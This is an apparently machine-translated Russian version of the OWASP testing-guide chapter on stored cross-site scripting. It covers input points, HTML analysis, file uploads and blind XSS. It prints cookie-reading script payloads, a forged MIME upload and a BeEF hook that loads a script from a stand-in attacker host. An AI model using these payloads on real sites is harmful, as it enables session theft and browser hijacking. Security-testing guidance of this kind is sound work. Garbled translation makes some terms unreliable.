# Тестирование для хранимых сценариев на кросс-сайте

| ID |
| ------------- |
| WSTG-INPV-02 |

## Резюме

Хранится [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) является наиболее опасным типом кросс-сайта. Веб-приложения, которые позволяют пользователям хранить данные, потенциально подвержены атакам такого типа. В этой главе приведены примеры хранимых сценариев межсайтовых сценариев и связанных с ними сценариев эксплуатации.

Хранящийся XSS возникает, когда веб-приложение собирает входные данные от пользователя, который может быть вредоносным, а затем сохраняет этот ввод в хранилище данных для последующего использования. Хранящийся вход не фильтруется правильно. Как следствие, вредоносные данные будут являться частью веб-сайта и запускаться в браузере пользователя под привилегиями веб-приложения. Поскольку эта уязвимость обычно включает в себя как минимум два запроса к приложению, это также может называться XSS второго порядка

Эта уязвимость может использоваться для проведения ряда атак на основе браузера, включая:

- Угон браузера другого пользователя
- Сбор конфиденциальной информации, просматриваемой пользователями приложения
- Псевдообезжирение приложения
- Портовое сканирование внутренних хостов («внутреннее» по отношению к пользователям веб-приложения)
- Направленная доставка браузерных эксплойтов
- Другие злонамеренные действия

Хранящийся XSS не нуждается в вредоносной ссылке для использования. Успешная эксплуатация происходит, когда пользователь посещает страницу с сохраненным XSS. Следующие фазы относятся к типичному сохраненному сценарию атаки XSS:

- Атакующий хранит вредоносный код на уязвимой странице
- Пользователь аутентифицируется в приложении
- Пользователь посещает уязвимую страницу
- Вредоносный код выполняется браузером пользователя

Этот тип атаки также может использоваться с такими системами эксплуатации браузера, как [BeEF](https://beefproject.com) а также [XSS Proxy](http://xss-proxy.sourceforge.net/). Эти рамки позволяют разрабатывать сложные функции JavaScript.

Хранящийся XSS особенно опасен в областях приложений, где пользователи с высокими привилегиями имеют доступ. Когда администратор посещает уязвимую страницу, атака автоматически выполняется их браузером. Это может раскрыть конфиденциальную информацию, такую как токены авторизации сеанса.

## Цели теста

- Определите сохраненный ввод, который отражается на стороне клиента.
- Оцените входные данные, которые они принимают, и кодировку, которая применяется при возврате (если есть).

## Как проверить

### Тестирование черного ящика

Процесс выявления сохраненных уязвимостей XSS аналогичен процессу, описанному во время [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md).

#### Входные формы

Первый шаг - определить все точки, в которых пользовательский ввод сохраняется в серверной части, а затем отображается приложением. Типичные примеры сохраненного пользовательского ввода можно найти в:

- Страница пользователя / профиля: приложение позволяет пользователю редактировать / изменять данные профиля, такие как имя, фамилия, псевдоним, аватар, изображение, адрес и т. Д.
- Корзина: приложение позволяет пользователю хранить товары в корзине, которые затем могут быть рассмотрены позже
- Диспетчер файлов: приложение, которое позволяет загружать файлы
- Настройки / предпочтения приложения: приложение, которое позволяет пользователю устанавливать настройки
- Форум / Доска объявлений: приложение, которое позволяет обмениваться сообщениями между пользователями
- Блог: если приложение блога позволяет пользователям отправлять комментарии
- Журнал: если приложение хранит некоторые пользователи, вводятся в журналы.

#### Анализировать HTML-код

Ввод, хранящийся в приложении, обычно используется в тегах HTML, но его также можно найти как часть содержимого JavaScript. На данном этапе важно понимать, сохраняется ли ввод и как он позиционируется в контексте страницы. В отличие от отраженного XSS, рисовальщик должен также исследовать любые внеполосные каналы, через которые приложение получает и сохраняет входные данные пользователей.

**Note**: Все области приложения, доступные администраторам, должны быть проверены на наличие любых данных, представленных пользователями.

**Example**: Электронная почта хранится в `index2.php`

![Stored Input Example](images/Stored_input_example.jpg)\
*Figure 4.7.2-1: Stored Input Example*

HTML-код index2.php, в котором находится значение электронной почты:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

В этом случае тестер должен найти способ ввести код вне тега `<input> `, как показано ниже:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```

#### Тестирование на хранимый XSS

Это включает в себя тестирование входных проверок и фильтрацию элементов управления приложения. Основные примеры инъекций в этом случае:

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

Убедитесь, что вход представлен через приложение. Обычно это включает в себя отключение JavaScript, если реализованы элементы управления безопасностью на стороне клиента, или изменение HTTP-запроса с помощью веб-прокси. Также важно проверить одну и ту же инъекцию с HTTP GET и POST запросами. Вышеуказанная инъекция приводит к всплывающему окну, содержащему значения cookie.

> ![Stored XSS Exxample](images/Stored_xss_example.jpg)\
> *Figure 4.7.2-2: Stored Input Example*
>
> Код HTML после инъекции:
>
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> Входные данные сохраняются, и полезная нагрузка XSS выполняется браузером при перезагрузке страницы. Если приложение экранирует вход, тестировщики должны протестировать приложение на фильтрах XSS. Например, если строка «SCRIPT» заменяется пробелом или символом NULL, это может быть потенциальным признаком фильтрации XSS в действии. Существует много методов, чтобы избежать входных фильтров (см [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). Настоятельно рекомендуется, чтобы тестеры ссылались [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) а также [Mario](https://cybersecurity.wtf/encoder/) Читовые страницы XSS, которые предоставляют обширный список атак XSS и обходов фильтрации. Обратитесь к разделу «Бекросы и инструменты» для получения более подробной информации.

#### Кредитное плечо Хранится XSS с BeEF

Хранимый XSS может использоваться с помощью современных сред эксплуатации JavaScript, таких как [BeEF](https://www.beefproject.com) а также [XSS Proxy](http://xss-proxy.sourceforge.net/).

Типичный сценарий эксплуатации BeEF включает в себя:

- Ввод хука JavaScript, который связывается с платформой эксплуатации браузера злоумышленника (BeEF)
- Ожидание, когда пользователь приложения увидит уязвимую страницу, на которой отображается сохраненный вход
- Управление браузером пользователя приложения через консоль BeEF

Крюк JavaScript можно ввести, используя уязвимость XSS в веб-приложении.

**Example**: BeEF Инъекция в `index2.php`:

```html
aaa@aa.com"><script src=http://attackersite/hook.js></script>
```

Когда пользователь загружает страницу `index2.php`, браузер выполняет скрипт `hook.js`. Затем можно получить доступ к файлам cookie, скриншоту пользователя, буферу обмена пользователя и запустить сложные атаки XSS.

> ![Beef Injection Example](images/RubyBeef.png)\
> *Figure 4.7.2-3: Beef Injection Example*
>
> Эта атака особенно эффективна на уязвимых страницах, которые просматриваются многими пользователями с разными привилегиями.

#### Загрузка файла

Если веб-приложение позволяет загружать файлы, важно проверить, можно ли загрузить HTML-контент. Например, если разрешены файлы HTML или TXT, полезная нагрузка XSS может быть введена в загруженный файл. Pen-tester также должен проверить, позволяет ли загрузка файла устанавливать произвольные типы MIME.

Рассмотрим следующий запрос HTTP POST для загрузки файла:

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Этот недостаток дизайна может быть использован в атаках неправильного обращения MIME браузера. Например, безобидные файлы, такие как JPG и GIF, могут содержать полезную нагрузку XSS, которая выполняется при загрузке браузером. Это возможно, когда вместо этого можно установить тип MIME для изображения, такого как `image/gif`, в `text/html`. В этом случае файл будет обрабатываться клиентским браузером как HTML

HTTP POST Запрос подделан:

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

Также учтите, что Internet Explorer не обрабатывает типы MIME так же, как Mozilla Firefox или другие браузеры. Например, Internet Explorer обрабатывает файлы TXT с HTML-контентом в виде HTML-контента. Для получения дополнительной информации об обработке MIME см. Раздел «Официальные документы» в нижней части этой главы.

### Слепой межсайтовый скрипт

Слепой межсайтовый скрипт является формой сохраненного XSS. Обычно это происходит, когда полезная нагрузка атакующего сохраняется на сервере / инфраструктуре, а затем отражается обратно жертве из бэкэнд-приложения. Например, в формах обратной связи злоумышленник может отправить вредоносную полезную нагрузку с помощью формы, и как только внутренний пользователь / администратор приложения просматривает представление злоумышленника через бэкэнд-приложение, полезная нагрузка злоумышленника будет выполнена. Слепой межсайтовый скрипт трудно подтвердить в реальном сценарии, но один из лучших инструментов для этого [XSS Hunter](https://xsshunter.com/).

> Примечание. Тестерны должны тщательно учитывать последствия использования общедоступных или сторонних услуг для обеспечения конфиденциальности при проведении тестов безопасности. (См. #tools.)

### Тестирование серой коробки

Тестирование серого ящика похоже на тестирование черного ящика. В тестировании «серой коробки» у мастера-ручки есть частичные знания о применении. В этом случае информация о вводе пользователем, контроле проверки ввода и хранении данных может быть известна у автора.

В зависимости от доступной информации, обычно рекомендуется, чтобы тестировщики проверяли, как пользовательский ввод обрабатывается приложением, а затем сохраняется в серверной системе. Рекомендуются следующие шаги:

- Используйте интерфейсное приложение и введите ввод специальными / недействительными символами
- Анализировать ответ (ы) приложения
- Определить наличие входных средств проверки
- Получите доступ к серверной системе и проверьте, хранится ли вход и как он хранится
- Анализируйте исходный код и понимайте, как сохраненный ввод отображается приложением

Если исходный код доступен (как при тестировании в белом ящике), все переменные, используемые во входных формах, должны быть проанализированы. В частности, языки программирования, такие как PHP, ASP и JSP, используют предопределенные переменные / функции для хранения ввода из запросов HTTP GET и POST.

В следующей таблице приведены некоторые специальные переменные и функции, на которые следует обратить внимание при анализе исходного кода:

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |
| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |
| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files |
| `$_FILES` - HTTP File Upload variables |

**Note**: Приведенная выше таблица представляет собой только сводку наиболее важных параметров, но все входные параметры пользователя должны быть исследованы.

## Tools

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
- [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
- [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
- [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter finds all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.

## References

### OWASP Resources

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Books

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [Gunter Ollmann: "HTML Code Injection and Cross-site Scripting"](http://www.technicalinfo.net/papers/CSS.html)
- [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)
